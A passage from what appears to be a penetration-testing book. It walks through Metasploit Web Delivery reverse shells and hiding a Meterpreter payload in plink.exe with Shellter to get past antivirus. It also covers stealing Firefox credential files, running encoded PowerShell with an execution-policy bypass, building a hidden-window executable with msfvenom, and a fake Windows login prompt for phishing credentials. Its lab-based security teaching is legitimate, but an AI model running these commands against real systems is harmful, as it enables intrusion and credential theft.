And that is it; making Resource Files are really simple in Metasploit. But that is not all, we can increase their usefulness by incorporating Ruby scripting. Let’s look at some of the built-in Resource Files that include this, but first we need to cover Metasploit’s Global Variables.

Global Variables

Global Variables are special variables in Metasploit that remain constant across your sessions. There are specific commands just for these settings:

 set - Displays currently set variables

 setg - Set a variable

 get - Displays setting of individual variable

 unsetg - Deletes the setting for the variable

 save - Saves your variables to be used the next time you start Metasploit

So, simply type “set” to view all set variables in Metasploit:

![](Images/image00556.jpeg)

To set a global variable use “setg” with the variable name and setting:

 setg RHOSTS 192.168.1.93

You can then view it with the set or get command:

![](Images/image00557.jpeg)

And “unset” with the variable name deletes the global variable. You will want to unset Global Variables when you are done with them so they don’t interfere with your future sessions. Of course, if you want to save your variables for use the next time you start Metasploit, you can use the “save” command.

Though we won’t be covering any more of the Metasploit database commands in this book, you can create separate workspaces in Meterpreter to keep things separate and more organized:

![](Images/image00558.jpeg)

Pre-installed Resource Files & Ruby Integration

Now that we have covered Global Variables, let’s take a moment and look at some of the included Resource File scripts located in the “/usr/share/metasploit-framework/scripts/resource” directory.

![](Images/image00559.jpeg)

We will begin by looking at the ‘portscan.rc’ module. When executed, this module runs a port scan against the target set in the Global Variable “RHOSTS”. Viewing the file reveals that this resource script has a brief introduction and then the rest of the file is basically a Ruby script.

Notice the beginning “<Ruby>” tag and the ending “</Ruby>” tag. Everything in between these tags is the Ruby script. You can use Ruby programming in any resource file simply by entering the code between these tags as seen below:

![](Images/image00560.jpeg)

The powerful thing about using Ruby in resource files is the ability to call settings and variables from Metasploit and interact with the remote system. Read through the Portscan file. You will notice that this script pulls information from the RHOSTS and VERBOSE variables and uses them throughout the script.

Let’s see this Resource File in action

First check the Global settings to see if anything is already set, and then set (setg) the global variable RHOST to our target IP address:

![](Images/image00561.jpeg)

Now run the portscan.rc file with the resource command:

![](Images/image00562.jpeg)

This return the results of the port scan revealing which ports are open, what services are running on those ports and OS detection:

![](Images/image00563.jpeg)

Typing the “notes” command will list some of the details of our target:

![](Images/image00564.jpeg)

And “services” will display service information:

![](Images/image00565.jpeg)

If we wanted to auto scan a target for more information than is provided with portscan.rc we could use the “basic_discovery.rc”. This module is similar in that it runs a portscan on the target and uses the Global variables “RHOSTS” & “VERBOSE”, but runs several more port and vulnerability scans. After running this module you will find that a lot more information about the server is entered under “notes”:

![](Images/image00566.jpeg)

Take some time and look at the other resource files. Some of these can be very handy at automating attacks by themselves. But they also demonstrate how you can use Ruby to add intelligence to your own Resource files.

Conclusion

In this section we learned about resource files used in Metasploit. We saw how easy it is to create our own resource files and looked at the resource files that come with Metasploit. While you are going through this book, if you notice you are typing in the same commands over and over, try creating a RC script to save some time!

Resources

 Database commands: [https://www.offensive-security.com/metasploit-unleashed/using-databases/](https://www.offensive-security.com/metasploit-unleashed/using-databases/)

## Chapter 8

## Web Delivery

In this section we will learn how to quickly get a Meterpreter reverse shell from a Linux, Mac or Windows system using the Web Delivery exploit module. We will be using Metasploit and our Windows 7 & Metasploitable VMs as targets. We will also show that this module works against an optional Mac target. 

Let’s get started!

1.  From a Kali terminal, type “msfconsole”:

![](Images/image00567.jpeg)

2.  Now enter:

 use exploit/multi/script/web_delivery

 set lhost [Kali IP Address]

 set lport 4444

3.  Type, “show targets”:

![](Images/image00568.jpeg)

Notice we have 3 options, Python, PHP and PSH (PowerShell). We will be attacking a Windows system, so we will use PowerShell.

4.  Enter, “set target 2”
5.  Set the payload, “set payload windows/meterpreter/reverse_tcp”
6.  You can check that everything looks okay with “show options”:

![](Images/image00569.jpeg)

7.  Now type, “exploit”:

![](Images/image00570.jpeg)

This starts a listener server that hosts our payload and then waits for an incoming connection. All we need to do is run the generated PowerShell command on our target system.

8.  On the Windows 7 system, open a command prompt and paste in and execute the PowerShell command:

![](Images/image00571.jpeg)

And after a few seconds you should see:

![](Images/image00572.jpeg)

A meterpreter session open!

9.  Now type, “sessions” to list the active sessions
10.  Connect to it with “sessions -i 1”

![](Images/image00573.jpeg)

We now have a full Meterpreter shell to the target:

![](Images/image00574.jpeg)

![](Images/image00575.jpeg)

Type “exit” to quit the active session and “exit” again to exit Metasploit.

### Python Web Delivery vs. Linux

We can also use Web Delivery against Linux systems by using Python or PHP as a target. Let’s use the Metasploitable VM as the target. We will basically do everything the same, except set the target type to Python. 

 Start Metasploit

 use exploit/multi/script/web_delivery

 set lhost 192.168.1.39

 set lport 4444

 set target 0

Setting the target to 0 should automatically set the payload to the Python Meterpreter payload. When we execute this with “exploit” we again will be given a command string to enter on the target system, this time it is in python. When it is run on the Metasploitable system:

![](Images/image00576.jpeg)

We get a shell:

![](Images/image00577.jpeg)

And as we did with Windows, type “sessions” to get a list of active sessions and then connect to the active Linux Meterpreter shell with “sessions -i 1”:

![](Images/image00578.jpeg)

Works on Mac too!

If you have a Mac system, the Python Web Delivery option should work also. While still running Web Delivery module above just:

 Type, “background” to background the current session and then run the Python command in a Mac terminal:

![E:\Screen Shot 2015-07-01 at 2.21.11 PM.png](Images/image00579.jpeg)

This should open another session, this time to the Mac:

![](Images/image00580.jpeg)

 Again, type “sessions” to see active sessions.

 Then connect to it using, “sessions -I 2”:

![](Images/image00581.jpeg)

And we are in!

Type “exit” to quit the active sessions and “exit” again to exit Metasploit.

PHP Web Delivery Just as Easy

We can create a PHP version of Web Delivery just as easily. Just set the target to PHP and the payload to the PHP Meterpreter shell as below:

 Start Metasploit

 use exploit/multi/script/web_delivery

 set lhost 192.168.1.39

 set lport 4444

 set target 1

 set payload php/meterpreter/reverse_tcp

 exploit

Run the generated PHP command on the Metasploitable system:

![](Images/image00582.jpeg)

And we have a shell:

![](Images/image00583.jpeg)

And that is it; from one exploit module we can get remote shells with Windows, Linux or Mac. Close the terminal that you have open on the remote machine but leave the Web Delivery Meterpreter module running; we will use it again in a minute. 

PHP Shell - A Closer Look

We will cover attacking webservers in much greater detail later in the book. But let’s take a quick look at the PHP script that Web Delivery generates.

1.  Open the generated PHP URL in Kali’s Iceweasel
2.  When prompted go ahead and save the file:

![](Images/image00584.jpeg)

3.  Now open the file and read through it.

This looks like a functional script, but the starting PHP tag is commented out (#<?php) and the ending tag (?>) is missing. Just as in the Msfvenom shell creation, all we would need to do is fix the PHP starting tag and add and ending tag.

4.  Save the file as “evilshell.php”
5.  Now copy that file to Kali’s /var/www directory.
6.  Make sure the HTTP service is started (service apache2 start)
7.  Open the new PHP file in Iceweasel:

![](Images/image00585.jpeg)

Nothing seems to be happening, the connecting bar is just spinning, but if we look at Meterpreter we should see this:

![](Images/image00586.jpeg)

A shell opened to Kali system! Okay, silly I know - Why in the world would we want a shell to ourselves? The point is that we grabbed the code generated by a Kali module and enabled it to function as a PHP webpage script. Just as in the MsfVenom section, if we could get that PHP script uploaded to a remote website, we could get remote access to it through a browser. This section was a bit redundant to the Msfvenom PHP shell I know, but hopefully it helps to get you thinking outside the box a little. There are many different ways to use Metasploit!

Conclusion

In this section we have demonstrated how to use the Web Delivery module to obtain reverse shells on Windows, Linux and Mac systems using PowerShell, Python and PHP. We also learned how to change the PHP code generated by Web Delivery into a functional PHP webpage script.

Hopefully as you have seen, the Web Delivery module is very easy to use and works very well. When we look at using commands through Meterpreter later, the Web Delivery module is one way you can use to obtain the remote shells needed for the tutorials.

# Anti-Virus Bypass

## Chapter 9

## Bypassing Anti-Virus with Shellter

The main question when creating shellcode is, can you get it past the target’s defenses? This usually boils down to getting past Anti-Virus. Many Anti-Virus detectors are signature based – they look for a specific string or pattern in a malicious file. Chances are if you can find that string and change it, you might be able to bypass AV. The other option is obfuscating your shellcode in an attempt to hide it’s true identity.

There is a program called Evade by securepla.net ([https://www.securepla.net/antivirus-now-you-see-me-now-you-dont/](https://www.securepla.net/antivirus-now-you-see-me-now-you-dont/)) that breaks the detected shellcode up into sections. You take each file and run them through an AV scanner. Then just analyze the section that was detected as malicious using a hex editor. Sometimes it is just an ASCII string that is detected by the AV. Change the string and you could be good to go. I will leave this as something for the readers to explore.

Veil Evasion (covered in my first book) is also a good choice for bypassing Anti-Virus. It gives you multiple choices in payloads and was very good as bypassing AV, though in recent tests I have seen some of the payloads get flagged by AV.

We covered using the Veil Framework for Anti-Virus Evasion in my first book. This time let’s look at using “Shellter” for evading AV. The latest version of Shellter (4.0) for pentesters was revealed at B-Sides Lisbon in July, 2015\. Updates in version 4.0 include increased obfuscation through a custom encoder and polymorphic decoder and it also includes several Metasploit payloads to use.

Shellter works by taking a legit Windows .exe file, and adds the shell code to it. It then does a great job of modifying the file for AV bypass. The original Windows .exe file no longer functions, as this is a tool for pentesters not hackers, but the resultant shell created works great. In this section we will use the Windows 7 Virtual Machine as the target, and will use Shellter’s automatic mode which makes the whole process very pain free.

So enough talk, let’s see it in action!

### Using Shellter

Author:  Kyriakos Economou

Website:  [https://www.shellterproject.com/](https://www.shellterproject.com/)

Shellter is in the Kali repository but is not installed by default. So we will need to install it with the apt-get command.

To install:

 Type, “apt-get install shellter”:

![](Images/image00587.jpeg)

We will need a Windows 32 bit program to use as a host. Kali’s “usr/share/windows-binaries” has several. For this tutorial we will use the “plink.exe” command.

 Copy plink.exe to the Shellter directory (/usr/share/shellter)

 Change to the “/usr/share/shellter” directory

 Type “shellter” to start

 When prompted to install Wine Mono, click “install”

![](Images/image00588.jpeg)

Our options here are “Auto”, “Manual” or “Help”

 Choose ‘A’ for Automatic

 At the PE Target Prompt, enter “plink.exe”

It will take a few seconds to process the file.

 When prompted for Payloads select “L” and then “1” for Meterpreter_Reverse_TCP:

![](Images/image00589.jpeg)

 Next enter the IP address of your Kali system

 And then the port number to use (I used 5555)

![](Images/image00590.jpeg)

Shellter will obfuscate the code and crunch for a while. Then you should see:

![](Images/image00591.jpeg)

Success! Press “Enter” to exit shellter. We will now have two plink.exe files in the shellter directory:

 “plink.exe” is the file created by shellter containing the reverse shell

 “plink.exe.bak” is the original file

Now we need to start a listener service on the Kali system. Start Metasploit (“msfconsole”’ in a terminal) and then enter:

 use exploit/multi/handler

 set payload windows/meterpreter/reverse_tcp

 set lhost 192.168.1.39

 set lport 5555

 exploit

Now that Kali is waiting for a connection. Copy our plink.exe shellcode file to the Windows 7 system and run it:

![](Images/image00592.jpeg)

And we have a shell!

![](Images/image00593.jpeg)

If you compare the size of the backdoored exe to the original one you will notice that they are the exact same size. Each time you run Shellter you should get a slightly different file as random code is inserted during the obfuscation process. I uploaded the file to Virustotal to scan it for malicious content:

![](Images/image00594.jpeg)

One (!) anti-virus engine detected it as malicious. And it was not a mainstream AV normally found in large companies.

Conclusion

In this short chapter we saw how easy it is to use Shellter to create a reverse shell. We also saw that Anti-Virus programs do not always catch malicious files. Anti-Virus is great but it can’t stop everything, you need to train your company users to be vigilant when using internet sites, social media and e-mail. Avoid suspicious websites, don’t allow website popups or warnings to install anything and never open unsolicited or suspicious attachments in e-mails. As a network administrator, never allow employees to use privileged accounts for everyday usage. A little user vigilance can go a long way at protecting your network!

# Post Exploitation

## Chapter 10

## Post Modules & Railgun

In this chapter we will look at the Meterpreter Post modules, and learn about Railgun. Post modules are extremely handy add-on Ruby scripts that can be run after you get a remote shell. These mini-programs automate a lot of post exploitation processes making it very simple to manipulate a compromised system to recover data and even account credentials. For example, once you have an active shell, just run one of the post browser scripts, and you could pull data from the user’s internet browser.

The scripts are made even more powerful by using Railgun. Railgun greatly extends Meterpreter by allowing you to load DLLs and remotely call Windows functions against the system.  In doing so, this pretty much gives us a full range Windows API attack platform that allows us to do some pretty amazing things like using the compromised machine to decrypt stored passwords, or give up information about the target network.

Let’s start with Post Modules.  

### Post Modules

The Post Modules are located at “/usr/share/metasploit-framework/modules/post”. The directory includes sub-directories that contain attack scripts for several platforms including:

 Cisco

 Firefox

 Linux

 Multi

 OSx

 Windows

These directories are separated into additional sub-directories like “gather” or “manage”. Surf down through these directories to find the actual post modules. Under each manufacturer’s name you will find modules labeled with functional names. There is also a “Multi” directory that contains a mix of modules that again are separated into additional subdirectories like “gather” and “manage”.

Take a look around the directory structure and familiarize yourself with these post scripts. If you would like you can view the individual ruby files to see how they work. We can use any of the relative Post modules in Meterpreter to pull information from the victim’s system post exploitation.

For example, let’s see the “firefox_creds.rb” module in action. The file is physically located in the Kali “/usr/share/metasploit-framework/modules/post/multi/gather” directory. But to access it in Metasploit its location would be “post/multi/gather/firefox_creds”.

Viewing & Using Post File

You can view all the available post modules in Metasploit by typing “search post/”. There are a lot of them. But for now, we will just focus on one, the “Firefox_creds” module.

In Metasploit with an active session with our Windows 7 VM:

 Type, “info post/multi/gather/firefox_creds”

![](Images/image00595.jpeg)

This displays information about the module. Let’s go ahead and run this one against the current session:

 Enter, “run post/multi/gather/firefox_creds”

![](Images/image00596.jpeg)

Viewing the Recovered Loot

The module accesses the Windows 7 system and pulls information from the Firefox install. The data recovered is saved as “loot”.

Let’s background the session and see what loot we actually have:

 Type, “background”

 Enter, “loot”:

msf > loot

Loot

====

host                     service  type                           name                        content            info  

----                       --------------                           ---------                      ---------            ----

192.168.1.93      ff.profile.key3.db             firefox_key3.db             binary/db          key3.db

192.168.1.93      ff.profile.cookies.sqlite-wal  firefox_cookies.sqlite-wal  binary/sqlite-wal  cookies.sqlite-wal

192.168.1.93      ff.profile.cookies.sqlite-shm  firefox_cookies.sqlite-shm  binary/sqlite-shm  cookies.sqlite-shm

The information is stored as files in the Kali “~/.msf4/loot” directory:

![](Images/image00597.jpeg)

There are a couple ways to view the loot, one is to drop back to Kali, open a new terminal prompt and browse the recovered data using the SQLite browser.

At a terminal prompt enter:

 Sqlitebrowser [Filename.bin]

![](Images/image00598.jpeg)

The graphical SQLite browser program opens showing the database:

![](Images/image00599.jpeg)

Or, if you like, you could just run the strings program (type, “strings [Filename.bin]”) to see what websites the target frequents.

Conclusion

We only covered one Post script to see how it worked. There are a multitude of Post modules available. Take some time and look around the post directory. I am pretty sure you will find some modules that interest you. And when you find one you like, read through the code to see how if functions. It is very helpful to read through the scripts to see how they function. The beauty of having all the scripts in Ruby is that they can be easily viewed and even modified if needs be. Also, every once in a while you might run into a script that just doesn’t work quite right with your target or you want to add additional functionality.

### IRB Railgun

Railgun allows us to step beyond canned attacks and enables us to use the power of the Windows API during remote exploit. It does so by allowing us to load DLLs and remotely call Windows functions against the target. We will only touch on Railgun briefly. If you are already familiar with Ruby, you will most likely love Railgun. But long time Windows users might find it easier to use PowerShell (covered next) to accomplish what they need to do against a Microsoft system.

Railgun Definition location:

/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/def

Railgun usage is defined by definition files located in the Kali directory above. Looking at the names you will notice that they directly correspond to standard Windows DLL files:

![](Images/image00600.jpeg)

The “def_Kernel32.rb” file corresponds to the Windows Kernel32 DLL; “def_user32.rb” corresponds to the User32 DLL, etc. Inside each DLL definition file are function definitions that allow you to use said function in Railgun. Confusing right? Let’s take a look.

If we view the “def_user32.rb” file it might make more sense:

![](Images/image00601.jpeg)

Each function is listed by name and then the necessary variables for each function are included. Where do they get this variable information? The definitions come directly from the Microsoft MSDN function listings.

For example, here is the MSDN listing for Message Box:

![](Images/image00602.jpeg)

([https://msdn.microsoft.com/en-us/library/windows/desktop/ms645505%28v=vs.85%29.aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms645505%28v=vs.85%29.aspx))

Look familiar? The definitions in railgun exactly match the requirements for the DLL functions making railgun use seamless to the victim machine. Railgun provides legitimate function calls properly formatted for the DLL and the Windows system responds as if it were a local program making the request.

If you read further down the MSDN webpage for each function you will see what each variable represents and it even tells you what type of information to enter for each one. You simple use the information provided from the MSDN page to fill in the function call in Railgun. Probably still a little bit confusing, but let’s see this in action.

From an existing Meterpreter session to our Windows 7 VM:

 Type, “irb” to open the Interactive Ruby Shell

![](Images/image00603.jpeg)

Notice the prompt changes to “>>”. Any Ruby commands that we input will be executed on the Windows system. Let’s create a pop-up message box on the Windows system using the function discussed above.

At the IRB prompt, enter the following command:

client.railgun.user32.MessageBoxA(0,"Little Bo Peep Lost Her Sheep!","System Error","MB_ABORTRETRYIGNORE")

As seen here:

![](Images/image00604.jpeg)

When the command is entered, it will wait for a response from the Windows system to complete.

![](Images/image00605.jpeg)

And on the Windows system we see the message, “Little Bo Peep Lost Her Sheep!” – Oh No’s!

Though this is not very productive from a security tester’s point of view (unless you want the target to know that you are there), it is an easy example on how Railgun works in Metasploit. If we analyze the command, we see how each variable works. The definitions from the MSDN page tells us:

 hWnd [in, optional] = Input which is NULL or “0”

 lpText [in, optional] = The Message to be Displayed

 lpCaption [in, optional] = The Dialog Box Title

 uType [in] = A parameter that correlates to pre-defined buttons

So in our example:

![](Images/image00606.jpeg)

This then becomes:

![](Images/image00607.jpeg)

So in essence the process is, look up the Windows DLL function that you want to use. Then find the Railgun function in the definitions files and create the IRB command. Not all the functions (or DLLs) are included in the Ruby definition files. They can be added by hand, but from personal experience and choice I usually just use an existing post module that already is using railgun or I use PowerShell rather than trying to add new Ruby definitions.

Conclusion

In this section we looked at how to use Post modules to perform post exploitation. We also quickly looked at how to use Railgun to interact with Windows DLL functions. In the next section we will look at using PowerShell for post exploitation.

Resources

 [https://www.offensive-security.com/metasploit-unleashed/windows-post-gather-modules/](https://www.offensive-security.com/metasploit-unleashed/windows-post-gather-modules/)

 [https://www.offensive-security.com/metasploit-unleashed/linux-post-gather-modules/](https://www.offensive-security.com/metasploit-unleashed/linux-post-gather-modules/)

 [https://www.offensive-security.com/metasploit-unleashed/os-post-gather-modules/](https://www.offensive-security.com/metasploit-unleashed/os-post-gather-modules/)

 [https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation)

 [https://msdn.microsoft.com/library/windows/desktop/hh920508.aspx](https://msdn.microsoft.com/library/windows/desktop/hh920508.aspx)

 [https://www.defcon.org/images/defcon-20/dc-20-presentations/Maloney/DEFCON-20-Maloney-Railgun.pdf](https://www.defcon.org/images/defcon-20/dc-20-presentations/Maloney/DEFCON-20-Maloney-Railgun.pdf)

## Chapter 11

## Metasploit & PowerShell for Post Exploitation

![](Images/image00608.jpeg)

You have a remote shell to a Windows box in Metasploit, but what can you do? Granted Metasploit is loaded with features, options and tons of post modules (which are all amazing by the way), what if you wanted to do something a bit more custom? Say, like adding custom pop-ups and even voice, but you have no clue how to program in the program’s native Ruby language. How about using Window’s PowerShell? In this section we will learn how to perform post exploitation functions using PowerShell, Windows built in scripting language.

Let me start this out by saying I am no programmer, so please bear with me. Secondly, I would like to thank Mubix over at [Room362.com](http://www.room362.com) for the help with creating encoded PowerShell scripts. Mubix is well known for his “Metasploit Minute” training on Hak5, if you want some exceptional Metasploit instruction, check it out.

A while back I was talking with a military IT trainer about exploit capabilities and we came up the thought that wouldn’t it be cool if when a machine was exploited during a red team pentest, if it would pop up a Windows error message on the screen saying, “Knock, Knock Neo.” You know the famous line from the Matrix movie.

And wouldn’t it be something if you could get the computer to speak to the target system in a woman’s voice saying the same thing? What if we also wanted to pop up a picture on the target system of the green text filled Matrix screen? I mean wouldn’t that be cool too?

Well, with PowerShell, you can!

### PowerShell Basics

Microsoft Windows comes with PowerShell (powershell.exe) and an Integrated Scripting Environment (powershell_ise) already built in:

![](Images/image00609.jpeg)

You can just hit the Windows Start button and type PowerShell into the search bar, or run PowerShell.exe from a command prompt. When you execute the file, a special looking PowerShell Command Prompt opens as shown below:

![](Images/image00610.jpeg)

You can enter any PowerShell command and it will run it, like the mandatory “Write-Host ‘Hello World!’” message:

PS C:\Users\Dan> Write-Host 'Hello World!'

Hello World!

PS C:\Users\Dan>

So if we wanted to open up a Windows message box, we can do so by entering the following two commands:

 [System.Reflection.Assembly]::LoadWithPartialName(“System.Windows.Forms”)

 [System.Windows.Forms.MessageBox]::Show(“Hello World!” , “Important Message” , 1)

![](Images/image00611.jpeg)

The two commands prepare and call a Windows Message box with the message “Hello World”, the title “Important Message” and the Windows Message Box style of 1, which is a simple OK/ Cancel box.

Making Windows Talk to You

What a lot of people don’t know is that Windows has built in text to speech capability (I believe it started in Windows Vista). Windows can read back any text given to it in a computerized voice (Windows 7) or multiple voices (Windows 8).

To try this out, in PowerShell type:

 (New-Object -ComObject SAPI.SPVoice).Speak(“Hello World!”)

![](Images/image00612.jpeg)

In Windows 7 you will instantly hear a Woman’s voice saying, “Hello World!”

Sometimes what is spoken doesn’t quite match what you typed. To get a more accurate sounding translation you may want to play with the words a little bit like this:

(New-Object -ComObject SAPI.SPVoice).Speak(“Owh Nohs I have been hackered by the North Core E Ins”)

Problems Running Remote Scripts

The beauty of PowerShell is that as we enter commands our Windows system will execute them. So if we get a remote shell to the Windows machine, we should theoretically be able to run PowerShell commands and completely control the Windows box! There is one problem though, by default Windows will not allow remote or batch PowerShell commands to run outside of an administrator context.

Let’s try the examples above, but this time we will put the speak command into a .ps1 PowerShell batch file. We will then try to run that file with PowerShell.

 In Windows, simply take your favorite “speak” command and save it in a text file with the .ps1 extension as shown below:

![](Images/image00613.jpeg)

 Then run the file using the command, “powershell -F speak.ps1”.

When you do, you are faced with an error message - The file “cannot be loaded because the execution of scripts is disabled on this system.” Windows has disabled running scripts by default unless the execution policy is changed. So what can we do?

How about just bypassing it? If we use this command, it works:

powershell.exe -executionpolicy bypass -file speak.ps1

We can also use this same command to run a PS1 file remotely on a Windows system from an active Meterpreter shell:

![](Images/image00614.jpeg)

And it will work correctly, excellent!

But there is an additional problem when we try to run a single command remotely through Meterpreter. If we try to run this command remotely from our Meterpreter shell:

powershell.exe -executionpolicy bypass -command (New-Object -ComObject SAPI.SPVoice).Speak("Owh Nohs I have been hackered by the North Core E Ins")

We will get this message:

![](Images/image00615.jpeg)

To guarantee that our PowerShell script will run pretty much every time through our remote shell, the solution is to encrypt it. This will also make it a little bit harder to decipher if the network communication is intercepted and analyzed.

The best way to do this is using a technique from Mubix’s “Powershell Popups + Capture” article:

[http://www.room362.com/blog/2015/01/12/powershell-popups-plus-capture/](http://www.room362.com/blog/2015/01/12/powershell-popups-plus-capture/)

You can see the step-by-step process that we will follow.

1.  Create a text file containing the PowerShell commands, I used something like this:

$shell = New-Object -ComObject “Shell.Application”;
$shell.minimizeall();
Start-Sleep -s 2;
[System.Reflection.Assembly]::LoadWithPartialName(“System.Windows.Forms”);
[System.Windows.Forms.MessageBox]::Show(“Knock, knock, Neo.” , “Warning” , 2);
(New-Object -ComObject SAPI.SPVoice).Speak(“Knock, Knock Knee Oh, the Matrix has you!”);
c:\test\matrix.jpg;

2.  Save it to Kali’s Root folder as “power.txt”.

The first two lines allow the script to clear the user’s screen by minimizing all open windows. We then pause the script for a couple seconds for dramatic effect. The next two lines pop up a Windows (Abort, Retry, Ignore) message box with the movie message, “Knock, Knock Neo.”

Once the user clicks on one of the message box buttons, the script calls the Windows built in text to speech capabilities to audibly speak the same message out of their speakers. Sometimes the words don’t come out exactly like they should so you need to help the Windows voice API by using slightly different, but similar sounding words (ex. “Knee Oh” instead of “Neo”).

The final command opens a Matrix .jpg file that we would need to have already uploaded to the system via the Meterpreter upload command. (Pick a big one that fills the screen!)

We need to take the text file and encode it as Mubix’s site shows:

3.  cat power.txt | iconv --to-code UTF-16LE | base64

[![PowerPoint Text to Speech](Images/image00616.jpeg)](https://cyberarms.files.wordpress.com/2015/01/powerpoint-text-to-speech.png)

4.  Copy that text into Leafpad. We will need to remove all of the carriage returns from the text. When you are done, the entire text should fit on one long line.
5.  Then run the following command in our remote Meterpreter shell, adding in the encoded text stream from Leafpad:

 powershell -ep bypass -enc <Paste in the Encoded Text>

![](Images/image00617.jpeg)

And that is it! On the Windows system a message box will open, the message should play over their speakers and the matrix file (if you uploaded one) will be displayed:

[![Powershell Message Box](Images/image00618.jpeg)](https://cyberarms.files.wordpress.com/2015/01/powershell-message-box.png)

One more step that would make this even more visually convincing in a red team pentest would be to use Meterpreter’s built in webcam capability to first snap a picture of the remote user at his computer, upload that picture to their system in place of the matrix.jpg, and then run the command for a more personalized message from “the Matrix”!

That is pretty interesting, but what else can we do? How about remotely play videos?

### Playing YouTube Videos

About three years ago computer workstations at two Iranian nuclear facilities allegedly began playing AC/DC’s Thunderstruck at random times and at full volume. In this tutorial we will be using the PowerShell code to play AC/DC’s hit song at full volume from the “Invoke-TwitterBot”1 script written by Christopher “@obscuresec” Campbell. If you did not see his 2013 Shmoocon talk, “Building a PowerShell Bot”, check this out:

[https://www.youtube.com/watch?v=2manBaoP7Bk](https://www.youtube.com/watch?v=2manBaoP7Bk).

A section in the botnet script ([https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot](https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot)) plays Thunderstruck in a hidden IE window and keeps adjusting the audio up for three minutes. Constantly adjusting the sound up ties up system resources and makes the computer a bit un-responsive during the attack, making this more difficult to figure out what is going on. Using this script and the encoding technique we can deliver it directly with PowerShell via Meterpreter.

![](Images/image00619.jpeg)

1.  From @obscuresec’s script, grab the following code under the “!Thunderstruck” section: 

[string] $VideoURL = "http://www.youtube.com/watch?v=v2AC41dglnM"

#Create hidden IE Com Object

$IEComObject = New-Object -com "InternetExplorer.Application"

$IEComObject.visible = $False

$IEComObject.navigate($VideoURL)

$EndTime = (Get-Date).addminutes(3)

Write-Verbose "Loop will end at $EndTime"

#ghetto way to do this but it basically presses volume up to raise volume in a loop for 3 minutes

do {

$WscriptObject = New-Object -com wscript.shell

$WscriptObject.SendKeys([char]175)

}

until ((Get-Date) -gt $EndTime)

The “$VideoURL” string sets the song, which is of course, AC/DC’s Thunderstruck. The $IEComObject section tells PowerShell to open Internet Explorer on the target system and navigate to the YouTube video.

The .visible = $False section tells PowerShell to hide the IE window so that it does not show up. Set this to $True if you want to be able to see the Internet Explorer window. If not, you will not be able to close the IE window if you want to stop it early, without running Task Manager and exiting the iexplorer.exe processes manually.

The rest of the script creates a 3 minute loop (the length of the song) where the Up Volume key (char 175) is called repeatedly. As mentioned earlier, this loop seems to really draw down the target computer, you may want to set it to a shorter time period.

2.  Put the code in a text file, something like, “Thunderstruck.txt”.
3.  Base64 encode the file:

![](Images/image00620.jpeg)

4.  And that is it, now all we need to do is use Metasploit to get a remote shell to the target system and then call the encoded script in our remote shell using PowerShell, like so:

![](Images/image00621.jpeg)

After a short pause the target remote system will begin playing “Thunderstruck” at maximum volume. If the user tries to turn down the volume using the speaker icon, it will fight them by turning it back up until the song is over.

### Turning it into an Executable File

We can turn the PowerShell script into a Windows executable file using Msfvenom and PowerShell:

msfvenom -p windows/exec CMD="powershell -ep bypass -W Hidden -enc [Encrypted PowerShell script]" -f exe -e x86/shikata_ga_nai -o /root/Desktop/thunder1.exe

The command above uses the “Windows/Exec” Metasploit module to turn the PowerShell commands into an executable file. The file is encrypted and then saved to the Desktop as “Thunder1.exe”:

![](Images/image00622.jpeg)

When run on a Windows machine the PowerShell script is run hidden from view (-W Hidden) and in this case will not stop playing the music unless the Internet Explorer process is ended using Task Manager.

Reader Challenge

The Knock, Knock Neo script is interesting, but it would be more personalized if the script called the user by name. As a reader challenge, can you modify the script to call the user by name? I’ll give you a hint, one way would be to use the “$env:username” environment variable.

Similar Attack on a Mac

I showed this to some friends and was promptly told to “buy a Mac”. So let’s see how to do something similar on a Mac. Using the “Web Delivery” Exploit set the Target type to Python (Option “0”) and the payload to “python/meterpreter/reverse_tcp”. Copy the resultant Python script and run it on a Mac. When you get the remote shell, connect to the Meterpreter session and then type:

 shell

 say "Knock, knock Neo. The Matrix has you"

 osascript -e 'tell app "Finder" to display dialog "Knock, knock, Neo."'

![](Images/image00623.jpeg)

And you should see this pop-up on the Mac:

![](Images/image00624.jpeg)

The spoken message will also display through their speakers. Mac’s have a lot of built in voices. You can view the entire list by typing “say -v ‘y’” in the shell:

![](Images/image00625.jpeg)

You can then switch to a different voice using the “-v” switch and then type your message:

 say -v "Zarvox" "Ex Ter Men Nate the Doctor"

Now let’s switch the topic back to Windows and take a look at a built in post module that uses PowerShell.

### Windows Gather User Credentials (phishing)

Module Creators: Wesley Neelen & Matt Nelson

The “phish_windows_credentials” post module was added to Metasploit fairly recently and is a perfect example of how PowerShell can be used in an exploit. How it works is that once you have a remote shell connection, you run this module and set a program name to watch. Once the remote system runs the monitored program, this module pops up a login credentials box. When the victim types in their credentials, they are stored for our viewing.

For this example we will use an active session on our Windows 7 target. We will set WordPad as the process, so that when the victim starts WordPad a login prompt box will appear on their screen asking for credentials. The entered credentials will then appear on our Kali system.

To use the post module:

 use post/windows/gather/phish_windows_credentials

 set PROCESS <Program to Monitor>

 set SESSION <session number to use>

 run

Let’s see this in action:

1.  Background an active remote session
2.  Type, “use post/windows/gather/phish_windows_credentials”
3.  Type, “show options”:

![](Images/image00626.jpeg)

4.  Type, “set process wordpad.exe”
5.  And then, “set session 1”
6.  Finally enter, “run”:

![](Images/image00627.jpeg)

Now on the Windows 7 system, start WordPad. On our Kali system it detects that WordPad was started. It stops WordPad from running and pops up a Windows Security login box:

![](Images/image00628.jpeg)

When the user enters their credential, the script restarts WordPad and we get their credentials:

[*] New process detected: 3984 wordpad.exe

[*] Killing the process and starting the popup script. Waiting on the user to fill in his credentials...

[+] UserName             Domain                     Password                

----------------------------------------------------------------------                

Dan                    WIN-42ORBM3SRVF         password   

Conclusion

As you can see combining PowerShell based scripting attacks with Metasploit allows some pretty interesting attack vectors. The imagination of the attacker and his skill level are really the only limiting factors of what can be accomplished. PowerShell based attacks are constantly being released. A very interesting Post Exploitation agent call “Empire” was just released that looks extremely interesting:

